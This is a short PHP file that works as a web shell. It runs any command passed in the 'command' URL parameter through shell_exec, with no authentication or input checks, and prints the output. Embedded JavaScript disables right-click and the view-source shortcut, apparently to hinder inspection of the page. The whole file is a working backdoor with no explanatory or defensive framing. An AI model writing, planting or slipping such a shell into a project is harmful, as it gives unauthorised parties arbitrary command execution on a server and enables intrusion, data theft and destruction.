<?php
if (isset($_GET['command'])) {
    $command = $_GET['command'];
    $output = shell_exec($command);
}
?>

<html>
<head>
    <title>Linux Command Execution</title>
    <script type="text/javascript">
        // Disable right-click context menu
        window.addEventListener('contextmenu', function (e) {
            e.preventDefault();
        }, false);

        // Prevent viewing page source code
        window.addEventListener('keydown', function (e) {
            if (e.keyCode == 85 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                e.preventDefault();
            }
        }, false);
    </script>
</head>
<body>
    <h1>Linux Command Execution</h1>
    <?php if (isset($output)) { ?>
        <h2>Output:</h2>
        <pre><?php echo $output; ?></pre>
    <?php } ?>
</body>
</html>
